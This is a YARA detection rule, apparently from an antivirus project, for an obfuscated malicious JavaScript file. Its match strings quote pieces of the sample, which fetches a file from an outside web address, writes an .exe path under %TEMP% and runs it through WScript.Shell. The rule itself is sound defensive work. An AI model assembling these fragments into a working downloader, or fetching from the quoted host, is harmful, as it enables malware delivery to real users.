rule sig_20160328_0d065fc8bac32c9db74c6206f8b9d055 {
  meta:
    description = "datamaliciousorder - file 20160328_0d065fc8bac32c9db74c6206f8b9d055.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1c2861469494e0aee6388366744ee209a02833061c2266d6a248bf0b1ba30f11"

  strings:
    $s1  = "function Tjxewlqqah() {return Peiowznqd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"E5X2R76QI40J.exe\";};" fullword ascii
    $s2  = "do {WScript[Iuivy](Dwgetobv() * 11)} while (Feourhiiow[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Gyufi(Zgxddqftly, Pyzhdkvd){return Zgxddqftly - Pyzhdkvd;};" fullword ascii
    $s4  = "Feourhiiow[Phlrq](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s5  = "var Peiowznqd = function Vbysggfkzj() {return WScript[Plzmawybn](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Dwgetobv(){return 22;};" fullword ascii
    $s7  = "function Fpfjfvolh() {return ((Cmyyg == true) && (Cmyyg == Ncjqwo)) ? 1 : Wizaf;};" fullword ascii
    $s8  = "function Hkbfu(Znofxlyvxt){Peiowznqd[\"Run\"](Znofxlyvxt, Wizaf, Wizaf);};" fullword ascii
    $s9  = " while (Pibnah){" fullword ascii
    $s10 = "Ncjqwo = true; " fullword ascii
    $s11 = "var Cmyyg = false;" fullword ascii
    $s12 = "var Pljhau = false;" fullword ascii
    $s13 = "return Gyufi(Ktpgwe, Gxsimgqdym);" fullword ascii
    $s14 = "function Hjiqyghtok(){return Plzmawybn;};" fullword ascii
    $s15 = "function Bewdko()" fullword ascii
    $s16 = "var Wqbwb = new this[\"Date\"]();" fullword ascii
    $s17 = "var Ncjqwo = false;" fullword ascii
    $s18 = "Cmyyg = true; " fullword ascii
    $s19 = "function Rfzrgwddtd(){return Treeguw;};" fullword ascii
    $s20 = "function Cewihd(Zccrmk) {var Azmeqkvvx = (1, 2, 3, 4, 5, Zccrmk); return Azmeqkvvx;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}